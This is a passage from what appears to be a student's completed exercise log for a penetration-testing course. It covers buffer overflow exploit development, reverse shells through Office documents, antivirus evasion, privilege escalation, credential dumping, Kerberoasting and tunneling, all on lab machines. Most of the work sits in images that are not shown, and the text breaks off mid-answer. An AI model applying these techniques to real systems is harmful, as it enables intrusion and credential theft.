Exercises</h1><br/>☐ Build the fuzzer and replicate the SyncBreeze crash.<br /><a href=""><img src="images/1253-1.png" alt="images/1253-1.png" /></a><a href=""><img src="images/1253-2.png" alt="images/1253-2.png" /></a><br /><a href=""><img src="images/1253-3.png" alt="images/1253-3.png" /></a><br />☐ Inspect the content of other registers and stack memory. Does anything seem to be directly influenced by the fuzzing input?<br />the Ret to ntdll.KiFastSystemCall is no longer being called. EIP would have called it, but is overwritted with AAAA</div><div class='page'><h1 class='title level-4'>11.2.3.1 Exercises</h1><br/>☐ Write a standalone script to replicate the crash.<br /><a href=""><img src="images/1254-1.png" alt="images/1254-1.png" /></a><br /><a href=""><img src="images/1254-2.png" alt="images/1254-2.png" /></a><br />☐ Determine the offset within the input buffer to successfully control EIP.<br /><a href=""><img src="images/1254-3.png" alt="images/1254-3.png" /></a><br /><a href=""><img src="images/1254-4.png" alt="images/1254-4.png" /></a><br /><a href=""><img src="images/1254-5.png" alt="images/1254-5.png" /></a><br />☐ Update your standalone script to place a unique value into EIP to ensure your offset is correct.<br /><a href=""><img src="images/1254-6.png" alt="images/1254-6.png" /></a><br /><a href=""><img src="images/1254-7.png" alt="images/1254-7.png" /></a><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>11.2.5.1 Exercises</h1><br/>☐ Repeat the required steps in order to identify the bad characters that cannot be included in the payload.<br /><a href=""><img src="images/1255-1.png" alt="images/1255-1.png" /></a><br /><a href=""><img src="images/1255-2.png" alt="images/1255-2.png" /></a><br /><a href=""><img src="images/1255-3.png" alt="images/1255-3.png" /></a><br />☐ Why are these characters not allowed? How do these bad hex characters translate to ASCII?<br />These charachters are not allowed becasue when the program sees them it attempts to use them in a way that dissallows the continuance of our code.<br />0x00 = Null<br />0x0A = Line Feed<br />0x0D = Carriage Return<br />0x25 = %<br />0x26 = &amp;<br />0x2B = +<br />0x3D = =</div><div class='page'><h1 class='title level-4'>11.2.7.1 Exercises</h1><br/>☐ Locate the JMP ESP that is usable in the exploit.<br /><a href=""><img src="images/1256-1.png" alt="images/1256-1.png" /></a><br />☐ Update your PoC to include the discovered JMP ESP, set a breakpoint on it, and follow the execution to the placeholder shellcode.<br /><a href=""><img src="images/1256-2.png" alt="images/1256-2.png" /></a><br /><a href=""><img src="images/1256-3.png" alt="images/1256-3.png" /></a><br /><a href=""><img src="images/1256-4.png" alt="images/1256-4.png" /></a></div><div class='page'><h1 class='title level-4'>11.2.9.1 Exercises</h1><br/>☐ Update your PoC to include a working payload.<br /><a href=""><img src="images/1257-1.png" alt="images/1257-1.png" /></a><br /><a href=""><img src="images/1257-2.png" alt="images/1257-2.png" /></a><br />☐ Attempt to execute your exploit without using a NOP sled and observe the decoder corrupting the stack.<br /><a href=""><img src="images/1257-3.png" alt="images/1257-3.png" /></a><br /><a href=""><img src="images/1257-4.png" alt="images/1257-4.png" /></a><br />☐ Add a NOP sled to your PoC and obtain a shell from SyncBreeze.<br /><a href=""><img src="images/1257-5.png" alt="images/1257-5.png" /></a><br /><a href=""><img src="images/1257-6.png" alt="images/1257-6.png" /></a></div><div class='page'><h1 class='title level-4'>11.2.10.1 Exercise</h1><br/>☐ Update the exploit so that SyncBreeze still runs after exploitation.<br /><a href=""><img src="images/1258-1.png" alt="images/1258-1.png" /></a><br /><a href=""><img src="images/1258-2.png" alt="images/1258-2.png" /></a><br /><a href=""><img src="images/1258-3.png" alt="images/1258-3.png" /></a></div><div class='page'><h1 class='title level-4'>12.2.1.2 Exercises</h1><br/>☐ Log in to your dedicated Linux client using the credentials you received.<br /><a href=""><img src="images/1259-1.png" alt="images/1259-1.png" /></a><br />☐ On your Kali machine, recreate the proof-of-concept code that crashes the Crossfire server.<br /><a href=""><img src="images/1259-2.png" alt="images/1259-2.png" /></a><br />☐ Attach the debugger to the Crossfire server, run the exploit against your Linux client, and confirm that the EIP register is overwritten by the malicious buffer.<br /><a href=""><img src="images/1259-3.png" alt="images/1259-3.png" /></a></div><div class='page'><h1 class='title level-4'>12.3.1.1 Exercises</h1><br/>☐ Determine the correct buffer offset required to overwrite the return address on the stack.<br /><a href=""><img src="images/1260-1.png" alt="images/1260-1.png" /></a><br /><a href=""><img src="images/1260-2.png" alt="images/1260-2.png" /></a><br />☐ Update your stand-alone script to ensure your offset is correct.<br /><a href=""><img src="images/1260-3.png" alt="images/1260-3.png" /></a><br /><a href=""><img src="images/1260-4.png" alt="images/1260-4.png" /></a></div><div class='page'><h1 class='title level-4'>12.5.1.1 Exercises</h1><br/>☐ Determine the opcodes required to generate a first stage shellcode using msf-nasm_shell.<br /><a href=""><img src="images/1261-1.png" alt="images/1261-1.png" /></a><br />☐ Identify the bad characters that cannot be included in the payload and return address.<br /><a href=""><img src="images/1261-2.png" alt="images/1261-2.png" /></a></div><div class='page'><h1 class='title level-4'>12.6.1.1 Exercises</h1><br/>☐ Find a suitable assembly instruction address for the exploit using EDB.<br /><a href=""><img src="images/1262-1.png" alt="images/1262-1.png" /></a><br />☐ Include the first stage shellcode and return address instruction in your proof-of-concept and ensure that the first stage shellcode is working as expected by single stepping through it in the debugger.<br /><a href=""><img src="images/1262-2.png" alt="images/1262-2.png" /></a><br /><a href=""><img src="images/1262-3.png" alt="images/1262-3.png" /></a><br /><a href=""><img src="images/1262-4.png" alt="images/1262-4.png" /></a></div><div class='page'><h1 class='title level-4'>12.7.1.1 Exercises</h1><br/>☐ Update your proof-of-concept to include a working payload.<br /><a href=""><img src="images/1263-1.png" alt="images/1263-1.png" /></a><br /><a href=""><img src="images/1263-2.png" alt="images/1263-2.png" /></a><br />☐ Obtain a shell from the Crossfire application with and without a debugger<br /><a href=""><img src="images/1263-3.png" alt="images/1263-3.png" /></a><br /><a href=""><img src="images/1263-4.png" alt="images/1263-4.png" /></a></div><div class='page'><h1 class='title level-4'>13.2.2.1 Exercises</h1><br/>☐ Use msfvenom to generate a HTML Application and use it to compromise your Windows client.<br /><a href=""><img src="images/1264-1.png" alt="images/1264-1.png" /></a><br /><a href=""><img src="images/1264-2.png" alt="images/1264-2.png" /></a><br />☐ Is it possible to use the HTML Application attack against Microsoft Edge users, and if so, how?<br /><a href=""><img src="images/1264-3.png" alt="images/1264-3.png" /></a><br />It is possible to run HTA attacks against Microsoft Edge becasue both browsers allow users to allow the execution of HTML Applications.</div><div class='page'><h1 class='title level-4'>13.3.2.1 Exercise</h1><br/>☐ Use the PowerShell payload from the HTA attack to create a Word macro that sends a reverse shell to your Kali system.<br /><a href=""><img src="images/1265-1.png" alt="images/1265-1.png" /></a><br /><a href=""><img src="images/1265-2.png" alt="images/1265-2.png" /></a><br /><a href=""><img src="images/1265-3.png" alt="images/1265-3.png" /></a><br /><a href=""><img src="images/1265-4.png" alt="images/1265-4.png" /></a></div><div class='page'><h1 class='title level-4'>13.3.3.1 Exercise</h1><br/>☐ Use the PowerShell payload to create a batch file and embed it in a Microsoft Word document to send a reverse shell to your Kali system.<br /><a href=""><img src="images/1266-1.png" alt="images/1266-1.png" /></a><br /><a href=""><img src="images/1266-2.png" alt="images/1266-2.png" /></a></div><div class='page'><h1 class='title level-4'>13.3.4.1 Exercises</h1><br/>☐ Trigger the protection by Protected View by simulating a download of the Microsoft Word document from the Internet.<br /><a href=""><img src="images/1267-1.png" alt="images/1267-1.png" /></a><br />☐ Reuse the batch file and embed it in a Microsoft Publisher document to receive a reverse shell to your Kali system.<br /><a href=""><img src="images/1267-2.png" alt="images/1267-2.png" /></a><br /><a href=""><img src="images/1267-3.png" alt="images/1267-3.png" /></a><br />☐ Move the file to the Apache web server to simulate the download of the Publisher document from the Internet and confirm the missing Protected View.<br /><a href=""><img src="images/1267-4.png" alt="images/1267-4.png" /></a><br /><a href=""><img src="images/1267-5.png" alt="images/1267-5.png" /></a><br /><a href=""><img src="images/1267-6.png" alt="images/1267-6.png" /></a></div><div class='page'><h1 class='title level-4'>14.3.1.1 Exercises</h1><br/>☐ Connect to your dedicated Linux client and start the vulnerable Apache James service using the /usr/local/james/bin/run.sh script.<br /><a href=""><img src="images/1268-1.png" alt="images/1268-1.png" /></a><br />☐ Enumerate the target using port scanning utilities and use information from the banners and Internet searches to determine the software running on the machine.<br /><a href=""><img src="images/1268-2.png" alt="images/1268-2.png" /></a><br /><a href=""><img src="images/1268-3.png" alt="images/1268-3.png" /></a><br />☐ Use the searchsploit tool to find exploits for this version on the online resources mentioned in this module.<br /><a href=""><img src="images/1268-4.png" alt="images/1268-4.png" /></a><br />☐ Launch the exploit and verify that the payload is executed upon logging in to the machine.<br /><a href=""><img src="images/1268-5.png" alt="images/1268-5.png" /></a><br /><a href=""><img src="images/1268-6.png" alt="images/1268-6.png" /></a><br />☐ Attempt to modify the payload variable in order to get a reverse shell on the target machine.<br /><a href=""><img src="images/1268-7.png" alt="images/1268-7.png" /></a><br /><a href=""><img src="images/1268-8.png" alt="images/1268-8.png" /></a><br /></div><div class='page'><h1 class='title level-4'>15.1.3.1 Exercises</h1><br/>☐ Locate the exploit discussed in this section using the searchsploit tool in Kali Linux.<br /><a href=""><img src="images/1269-1.png" alt="images/1269-1.png" /></a><br />☐ Install the mingw-w64 suite in Kali Linux and compile the exploit code.<br /><a href=""><img src="images/1269-2.png" alt="images/1269-2.png" /></a></div><div class='page'><h1 class='title level-4'>15.1.4.1 Exercises</h1><br/>☐ Modify the connection information in the exploit in order to target the SyncBreeze installation on your Windows client.<br /><a href=""><img src="images/1270-1.png" alt="images/1270-1.png" /></a><br />☐ Recompile the exploit and use Wireshark to confirm that the code successfully initiates a socket connection to your dedicated Windows client.<br /><a href=""><img src="images/1270-2.png" alt="images/1270-2.png" /></a><br /><a href=""><img src="images/1270-3.png" alt="images/1270-3.png" /></a><br /><a href=""><img src="images/1270-4.png" alt="images/1270-4.png" /></a></div><div class='page'><h1 class='title level-4'>15.1.5.1 Exercise</h1><br/>☐ Find any valid return address instruction and alter the one present in the original exploit.<br /><a href=""><img src="images/1271-1.png" alt="images/1271-1.png" /></a><br /><a href=""><img src="images/1271-2.png" alt="images/1271-2.png" /></a></div><div class='page'><h1 class='title level-4'>15.1.6.1 Exercises</h1><br/>☐ Generate a reverse shell payload using msfvenom while taking into account the bad characters of our exploit.<br /><a href=""><img src="images/1272-1.png" alt="images/1272-1.png" /></a><br />☐ Replace the original payload with the newly generated one.<br /><a href=""><img src="images/1272-2.png" alt="images/1272-2.png" /></a><br />☐ Attach the debugger to the target process and set a breakpoint at the return address instruction.<br /><a href=""><img src="images/1272-3.png" alt="images/1272-3.png" /></a><br />☐ Compile the exploit and run it. Did you hit the breakpoint?<br /><a href=""><img src="images/1272-4.png" alt="images/1272-4.png" /></a><br /><a href=""><img src="images/1272-5.png" alt="images/1272-5.png" /></a><br />No, I did not hit the break point. It appears as if we are 4 bytes off. Adding 4 Bytes to the begining should do the trick.<br /><a href=""><img src="images/1272-6.png" alt="images/1272-6.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>15.1.7.1 Exercises</h1><br/>☐ Fix the overflow buffer such that the EIP register will be overwritten by your chosen return address instruction.<br /><a href=""><img src="images/1273-1.png" alt="images/1273-1.png" /></a><br /><a href=""><img src="images/1273-2.png" alt="images/1273-2.png" /></a><br /><a href=""><img src="images/1273-3.png" alt="images/1273-3.png" /></a><br />☐ Install the ASX to MP3 Converter application located under the C:\Tools\fixing_exploits directory; download the exploit for ASX to MP3 Converter from EDB391 and edit it in order to get a shell on your dedicated Windows machine.<br /><a href=""><img src="images/1273-4.png" alt="images/1273-4.png" /></a><br /><br /><a href=""><img src="images/1273-5.png" alt="images/1273-5.png" /></a><br /><a href=""><img src="images/1273-6.png" alt="images/1273-6.png" /></a><br /><a href=""><img src="images/1273-7.png" alt="images/1273-7.png" /></a><br /><a href=""><img src="images/1273-8.png" alt="images/1273-8.png" /></a><br /><a href=""><img src="images/1273-9.png" alt="images/1273-9.png" /></a><br /><a href=""><img src="images/1273-10.png" alt="images/1273-10.png" /></a><br /><a href=""><img src="images/1273-11.png" alt="images/1273-11.png" /></a><br /><a href=""><img src="images/1273-12.png" alt="images/1273-12.png" /></a><br /><a href=""><img src="images/1273-13.png" alt="images/1273-13.png" /></a><br /><a href=""><img src="images/1273-14.png" alt="images/1273-14.png" /></a><br /><a href=""><img src="images/1273-15.png" alt="images/1273-15.png" /></a><br /><a href=""><img src="images/1273-16.png" alt="images/1273-16.png" /></a><br /><a href=""><img src="images/1273-17.png" alt="images/1273-17.png" /></a><br /><a href=""><img src="images/1273-18.png" alt="images/1273-18.png" /></a><br /><a href=""><img src="images/1273-19.png" alt="images/1273-19.png" /></a><br /><a href=""><img src="images/1273-20.png" alt="images/1273-20.png" /></a><br /><a href=""><img src="images/1273-21.png" alt="images/1273-21.png" /></a><br /><a href=""><img src="images/1273-22.png" alt="images/1273-22.png" /></a><br /><a href=""><img src="images/1273-23.png" alt="images/1273-23.png" /></a><br /><a href=""><img src="images/1273-24.png" alt="images/1273-24.png" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>15.2.3.1 Exercises</h1><br/>☐ Connect to your dedicated Linux lab client and start the apache2 service; the target web application is located under /var/www/https/.<br /><a href=""><img src="images/1274-1.png" alt="images/1274-1.png" /></a><br /><a href=""><img src="images/1274-2.png" alt="images/1274-2.png" /></a><br />☐ Modify the original exploit and set the base_url variable to the correct IP address of your dedicated Linux lab client as well as the protocol to HTTPS.<br /><a href=""><img src="images/1274-3.png" alt="images/1274-3.png" /></a><br />☐ Get familiar with the requests Python library and adjust your exploit accordingly to avoid SSL verification.<br /><a href=""><img src="images/1274-4.png" alt="images/1274-4.png" /></a><br /><a href=""><img src="images/1274-5.png" alt="images/1274-5.png" /></a><br /><a href=""><img src="images/1274-6.png" alt="images/1274-6.png" /></a><br />☐ Edit the username and password variables to match the ones from our test case (username “admin”, password “HUYfaw763”).<br /><a href=""><img src="images/1274-7.png" alt="images/1274-7.png" /></a><br />☐ Try to run the exploit against the Linux lab client, does it work? If not, try to explain why.<br /><a href=""><img src="images/1274-8.png" alt="images/1274-8.png" /></a><br />The exploit initially did not work because it the function that pulled the CSRF token from the address was not splitting it properly. </div><div class='page'><h1 class='title level-4'>15.2.4.1 Exercises</h1><br/>☐ Observe the error that is generated when running the exploit.<br /><a href=""><img src="images/1275-1.png" alt="images/1275-1.png" /></a><br />☐ Attempt to troubleshoot the code and determine why the error occurs.<br /><a href=""><img src="images/1275-2.png" alt="images/1275-2.png" /></a><br />☐ Modify the exploit in order to avoid the error and run it against your dedicated Linux client.<br /><a href=""><img src="images/1275-3.png" alt="images/1275-3.png" /></a><br /><a href=""><img src="images/1275-4.png" alt="images/1275-4.png" /></a><br />☐ Verify that your exploit worked by attempting to execute the whoami command using the remote php shell.<br /><a href=""><img src="images/1275-5.png" alt="images/1275-5.png" /></a><br />☐ Attempt to obtain a fully interactive shell with this exploit.<br /><a href=""><img src="images/1275-6.png" alt="images/1275-6.png" /></a></div><div class='page'><h1 class='title level-4'>17.3.3.2 Exercises</h1><br/>☐ Review the code from the PowerShell script and ensure that you have a basic understanding of how it works.<br /><a href=""><img src="images/1276-1.png" alt="images/1276-1.png" /></a><br />☐ Get a meterpreter shell back to your Kali Linux machine using PowerShell.<br /><a href=""><img src="images/1276-2.png" alt="images/1276-2.png" /></a><br /><a href=""><img src="images/1276-3.png" alt="images/1276-3.png" /></a><br />☐ Attempt to get a reverse shell using a PowerShell one-liner rather than a script.432<br /><a href=""><img src="images/1276-4.png" alt="images/1276-4.png" /></a><br /><a href=""><img src="images/1276-5.png" alt="images/1276-5.png" /></a></div><div class='page'><h1 class='title level-4'>17.3.3.4 Exercises</h1><br/>☐ Inject a meterpreter reverse shell payload in the WinRAR executable.<br /><a href=""><img src="images/1277-1.png" alt="images/1277-1.png" /></a><br />☐ Transfer the binary to your Windows client and ensure that it is not being detected by the antivirus.<br /><a href=""><img src="images/1277-2.png" alt="images/1277-2.png" /></a><br />☐ Run the WinRAR installer and migrate your meterpreter shell to prevent a disconnect.<br /><a href=""><img src="images/1277-3.png" alt="images/1277-3.png" /></a><br />☐ Attempt to find different executables and inject malicious code into them using Shellter.<br /><a href=""><img src="images/1277-4.png" alt="images/1277-4.png" /></a><br /><a href=""><img src="images/1277-5.png" alt="images/1277-5.png" /></a></div><div class='page'><h1 class='title level-4'>18.1.1.13 Exercise</h1><br/>☐ Perform various manual enumeration methods covered in this section on both your dedicated Windows and Linux clients. Try experimenting with various options for the tools and commands used in this section<br /><a href=""><img src="images/1278-1.png" alt="images/1278-1.png" /></a><br /><a href=""><img src="images/1278-2.png" alt="images/1278-2.png" /></a><br /><a href=""><img src="images/1278-3.png" alt="images/1278-3.png" /></a><br /><a href=""><img src="images/1278-4.png" alt="images/1278-4.png" /></a></div><div class='page'><h1 class='title level-4'>18.1.2.1 Exercises</h1><br/>☐ Inspect your Windows and Linux clients by using the tools and commands presented in this section in order to get comfortable with manual local enumeration techniques.<br /><a href=""><img src="images/1279-1.png" alt="images/1279-1.png" /></a><br /><a href=""><img src="images/1279-2.png" alt="images/1279-2.png" /></a><br />☐ Experiment with different windows-privesc-check and unix_privesc_check options.<br /><a href=""><img src="images/1279-3.png" alt="images/1279-3.png" /></a><br /><a href=""><img src="images/1279-4.png" alt="images/1279-4.png" /></a></div><div class='page'><h1 class='title level-4'>18.2.3.2 Exercise</h1><br/>☐ Log in to your Windows client as the admin user and attempt to bypass UAC using the application and technique covered above<br /><a href=""><img src="images/1280-1.png" alt="images/1280-1.png" /></a></div><div class='page'><h1 class='title level-4'>18.2.4.1 Exercises</h1><br/>☐ Log in to your Windows client as an unprivileged user and attempt to elevate your privileges to SYSTEM using the above vulnerability and technique.<br /><a href=""><img src="images/1281-1.png" alt="images/1281-1.png" /></a><br /><a href=""><img src="images/1281-2.png" alt="images/1281-2.png" /></a><br /><a href=""><img src="images/1281-3.png" alt="images/1281-3.png" /></a><br /><a href=""><img src="images/1281-4.png" alt="images/1281-4.png" /></a><br /><a href=""><img src="images/1281-5.png" alt="images/1281-5.png" /></a><br />☐ Attempt to get a remote system shell rather than adding a malicious user.<br /><a href=""><img src="images/1281-6.png" alt="images/1281-6.png" /></a><br /><a href=""><img src="images/1281-7.png" alt="images/1281-7.png" /></a><br /><a href=""><img src="images/1281-8.png" alt="images/1281-8.png" /></a><br /><a href=""><img src="images/1281-9.png" alt="images/1281-9.png" /></a><br /><a href=""><img src="images/1281-10.png" alt="images/1281-10.png" /></a><br /></div><div class='page'><h1 class='title level-4'>18.3.2.1 Exercise</h1><br/>☐ Log in to your Debian client as an unprivileged user and attempt to elevate your privileges to root using the above technique.<br /><a href=""><img src="images/1282-1.png" alt="images/1282-1.png" /></a><br /><a href=""><img src="images/1282-2.png" alt="images/1282-2.png" /></a><br /><a href=""><img src="images/1282-3.png" alt="images/1282-3.png" /></a></div><div class='page'><h1 class='title level-4'>18.3.3.1 Exercise</h1><br/>☐ Log in to your Debian client with your student credentials and attempt to elevate your privileges by adding a superuser account to the /etc/passwd file.<br /><a href=""><img src="images/1283-1.png" alt="images/1283-1.png" /></a></div><div class='page'><h1 class='title level-4'>19.4.2.1 Exercises</h1><br/>☐ Use Mimikatz to extract the password hash of an administrative user from the Windows client.<br /><a href=""><img src="images/1284-1.png" alt="images/1284-1.png" /></a><br />☐ Reuse the password hash to perform a pass-the-hash attack from your Kali system and obtain code execution on your Windows client.<br /><a href=""><img src="images/1284-2.png" alt="images/1284-2.png" /></a></div><div class='page'><h1 class='title level-4'>20.1.1.1 Exercises</h1><br/>☐ Connect to your dedicated Linux lab client and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.<br /><a href=""><img src="images/1285-1.png" alt="images/1285-1.png" /></a><br />☐ Attempt to replicate the port-forwarding technique covered in the above scenario.<br /><a href=""><img src="images/1285-2.png" alt="images/1285-2.png" /></a><br /><a href=""><img src="images/1285-3.png" alt="images/1285-3.png" /></a><br /><br /></div><div class='page'><h1 class='title level-4'>20.2.1.1 Exercises</h1><br/>☐ Connect to your dedicated Linux lab client and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.<br /><a href=""><img src="images/1286-1.png" alt="images/1286-1.png" /></a><br />☐ Run the ssh_local_port_forwarding.sh script from /root/port_forwarding_and_tunneling/ as root.<br /><a href=""><img src="images/1286-2.png" alt="images/1286-2.png" /></a><br />☐ Take note of the Linux client and Windows Server 2016 IP addresses shown in the Student Control Panel.<br /><a href=""><img src="images/1286-3.png" alt="images/1286-3.png" /></a><br />☐ Attempt to replicate the smbclient enumeration covered in the above scenario.<br /><a href=""><img src="images/1286-4.png" alt="images/1286-4.png" /></a><br /><a href=""><img src="images/1286-5.png" alt="images/1286-5.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>20.2.2.2 Exercises</h1><br/>☐ Connect to your dedicated Linux lab client via SSH and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.<br /><a href=""><img src="images/1287-1.png" alt="images/1287-1.png" /></a><br />☐ Close any SSH connections to your dedicated Linux lab client and then connect as the student account using rdesktop and run the ssh_remote_port_forward.sh script from /root/port_forwarding_and_tunneling/ as root.<br /><a href=""><img src="images/1287-2.png" alt="images/1287-2.png" /></a><br />☐ Attempt to replicate the SSH remote port forwarding covered in the above scenario and ensure that you can scan and interact with the MySQL service<br /><a href=""><img src="images/1287-3.png" alt="images/1287-3.png" /></a><br /><a href=""><img src="images/1287-4.png" alt="images/1287-4.png" /></a></div><div class='page'><h1 class='title level-4'>20.2.3.1 Exercises</h1><br/>☐ Connect to your dedicated Linux lab client and run the clear_rules.sh script from /root/port_forwarding_and_tunneling/ as root.<br /><a href=""><img src="images/1288-1.png" alt="images/1288-1.png" /></a><br />☐ Take note of the Linux client and Windows Server 2016 IP addresses.<br /><a href=""><img src="images/1288-2.png" alt="images/1288-2.png" /></a><br />☐ Create a SOCKS4 proxy on your Kali machine, tunneling through the Linux target.<br /><a href=""><img src="images/1288-3.png" alt="images/1288-3.png" /></a><br /><a href=""><img src="images/1288-4.png" alt="images/1288-4.png" /></a><br />☐ Perform a successful nmap scan against the Windows Server 2016 machine through the proxy.<br /><a href=""><img src="images/1288-5.png" alt="images/1288-5.png" /></a><br />☐ Perform an nmap SYN scan through the tunnel. Does it work? Are the results accurate?<br /><a href=""><img src="images/1288-6.png" alt="images/1288-6.png" /></a><br />The command does work, but the results are innacurate.<br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>20.3.1.1 Exercises</h1><br/>-Obtain a reverse shell on your windows lab client through the Sync Breeze vulnerability.<br /><a href=""><img src="images/1289-1.png" alt="images/1289-1.png" /></a><br />-Use plink.exe to establish a remote port forward to the MySQL service on your Windows 10 client.<br /><a href=""><img src="images/1289-2.png" alt="images/1289-2.png" /></a><br />-Scan the MySQL port via the remote port forward.<br /><a href=""><img src="images/1289-3.png" alt="images/1289-3.png" /></a></div><div class='page'><h1 class='title level-4'>20.4.1.1 Exercises</h1><br/>☐ Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.<br /><a href=""><img src="images/1290-1.png" alt="images/1290-1.png" /></a><br />☐ Using the SYSTEM shell, attempt to replicate the port forwarding example using netsh.<br /><a href=""><img src="images/1290-2.png" alt="images/1290-2.png" /></a><br /><a href=""><img src="images/1290-3.png" alt="images/1290-3.png" /></a></div><div class='page'><h1 class='title level-4'>20.5.1.1 Exercises</h1><br/>☐ Connect to your dedicated Linux lab client as the student account using rdesktop and run the http_tunneling.sh script from /root/port_forwarding_and_tunneling/ as root.<br /><a href=""><img src="images/1291-1.png" alt="images/1291-1.png" /></a><br />☐ Start the apache2 service and exploit the vulnerable web application hosted on port 443 (covered in a previous module) in order to get a reverse HTTP shell.599<br /><a href=""><img src="images/1291-2.png" alt="images/1291-2.png" /></a><br />☐ Replicate the scenario demonstrated above using your dedicated clients.<br /><a href=""><img src="images/1291-3.png" alt="images/1291-3.png" /></a><br /><a href=""><img src="images/1291-4.png" alt="images/1291-4.png" /></a><br /><a href=""><img src="images/1291-5.png" alt="images/1291-5.png" /></a></div><div class='page'><h1 class='title level-4'>21.2.1.1 Exercise</h1><br/>☐ Connect to your Windows 10 client and use net.exe to lookup users and groups in the domain. See if you can discover any interesting users or groups.<br /><a href=""><img src="images/1292-1.png" alt="images/1292-1.png" /></a></div><div class='page'><h1 class='title level-4'>21.2.2.1 Exercises</h1><br/>☐ Modify the PowerShell script to only return members of the Domain Admins group.<br /><a href=""><img src="images/1293-1.png" alt="images/1293-1.png" /></a><br /><a href=""><img src="images/1293-2.png" alt="images/1293-2.png" /></a><br />☐ Modify the PowerShell script to return all computers in the domain.<br /><a href=""><img src="images/1293-3.png" alt="images/1293-3.png" /></a><br />☐ Add a filter to only return computers running Windows 10.<br /><a href=""><img src="images/1293-4.png" alt="images/1293-4.png" /></a><br /><br /></div><div class='page'><h1 class='title level-4'>21.2.3.1 Exercises</h1><br/>☐ Repeat the enumeration to uncover the relationship between Secret_Group, Nested_Group, and Another_Nested_Group.<br /><a href=""><img src="images/1294-1.png" alt="images/1294-1.png" /></a><br /><a href=""><img src="images/1294-2.png" alt="images/1294-2.png" /></a><br /><a href=""><img src="images/1294-3.png" alt="images/1294-3.png" /></a><br />☐ The script presented in this section required us to change the group name at each iteration. Adapt the script in order to unravel nested groups programmatically without knowing their names beforehand.<br /><a href=""><img src="images/1294-4.png" alt="images/1294-4.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>21.2.4.1 Exercises</h1><br/>☐ Download and use PowerView to perform the same enumeration against the student VM while in the context of the Offsec account.<br /><a href=""><img src="images/1295-1.png" alt="images/1295-1.png" /></a><br /><a href=""><img src="images/1295-2.png" alt="images/1295-2.png" /></a><br />☐ Log in to the student VM with the Jeff_Admin account and perform a remote desktop login to the domain controller using the Jeff_Admin account. Next, execute the Get-NetLoggedOn function on the student VM to discover logged-in users on the domain controller while in the context of the Jeff_Admin account.<br /><a href=""><img src="images/1295-3.png" alt="images/1295-3.png" /></a><br /><a href=""><img src="images/1295-4.png" alt="images/1295-4.png" /></a><br />☐ Repeat the enumeration by using the DownloadString method from the System.Net.WebClient class in order to download PowerView from your Kali system and execute it in memory without saving it to the hard disk.<br /><a href=""><img src="images/1295-5.png" alt="images/1295-5.png" /></a><br /><a href=""><img src="images/1295-6.png" alt="images/1295-6.png" /></a><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>21.2.5.2 Exercises</h1><br/>☐ Repeat the steps from this section to discover the service principal name for the IIS server.<br /><a href=""><img src="images/1296-1.png" alt="images/1296-1.png" /></a><br />☐ Discover any additional registered service principal names in the domain.<br /><a href=""><img src="images/1296-2.png" alt="images/1296-2.png" /></a><br />☐ Update the script so the result includes the IP address of any servers where a service principal name is registered.<br /><a href=""><img src="images/1296-3.png" alt="images/1296-3.png" /></a><br />☐ Use the Get-SPN script638 and rediscover the same service principal names.<br /><a href=""><img src="images/1296-4.png" alt="images/1296-4.png" /></a><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>21.3.3.1 Exercises</h1><br/>☐ Use Mimikatz to dump all password hashes from the student VM.<br /><a href=""><img src="images/1297-1.png" alt="images/1297-1.png" /></a><br />☐ Log in to the domain controller as the Jeff_Admin account through Remote Desktop and use Mimikatz to dump all password hashes from the server.<br /><a href=""><img src="images/1297-2.png" alt="images/1297-2.png" /></a></div><div class='page'><h1 class='title level-4'>21.3.4.1 Exercises</h1><br/>☐ Repeat the manual effort of requesting the service ticket, exporting it, and cracking it by using the tgsrepcrack.py Python script.<br /><a href=""><img src="images/1298-1.png" alt="images/1298-1.png" /></a><br /><a href=""><img src="images/1298-2.png" alt="images/1298-2.png" /></a><br /><a href=""><img src="images/1298-3.png" alt="images/1298-3.png" /></a><br />☐ Perform the same action with any other SPNs in the domain.<br /><a href=""><img src="images/1298-4.png" alt="images/1298-4.png" /></a><br />☐ Crack the same service ticket using John the Ripper.<br /><a href=""><img src="images/1298-5.png" alt="images/1298-5.png" /></a><br />☐ Use the Invoke-Kerberoast.ps1 script to repeat these exercises.<br /><a href=""><img src="images/1298-6.png" alt="images/1298-6.png" /></a><br /><a href=""><img src="images/1298-7.png" alt="images/1298-7.png" /></a><br /><br /><br /></div><div class='page'><h1 class='title level-4'>21.3.5.1 Exercises</h1><br/>☐ Use the PowerShell script in this module to guess the password of the jeff_admin user.<br /><a href=""><img src="images/1299-1.png" alt="images/1299-1.png" /></a><br />☐ Use the Spray-Passwords.ps1 tool to perform a lookup brute force attack of all users in the domain from a password list.<br /><a href=""><img src="images/1299-2.png" alt="images/1299-2.png" /></a></div><div class='page'><h1 class='title level-4'>21.4.2.1 Exercise</h1><br/>☐ Execute the overpass the hash attack above and gain an interactive command prompt on the domain controller. Make sure to reboot the Windows 10 client before starting the exercise to clear any cached Kerberos tickets.<br /><a href=""><img src="images/1300-1.png" alt="images/1300-1.png" /></a><br /><a href=""><img src="images/1300-2.png" alt="images/1300-2.png" /></a><br /><a href=""><img src="images/1300-3.png" alt="images/1300-3.png" /></a><br /><a href=""><img src="images/1300-4.png" alt="images/1300-4.png" /></a><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>21.4.3.1 Exercises</h1><br/>☐ Create and inject a silver ticket for the iis_service account.<br /><a href=""><img src="images/1301-1.png" alt="images/1301-1.png" /></a><br /><a href=""><img src="images/1301-2.png" alt="images/1301-2.png" /></a><br />☐ How can creating a silver ticket with group membership in the Domain Admins group for a SQL service provide a way to gain arbitrary code execution on the associated server?<br />Without being a member of the domain admins group you are likely not going to be able to access the Sql server, which can allow you code execution directly. In addition, 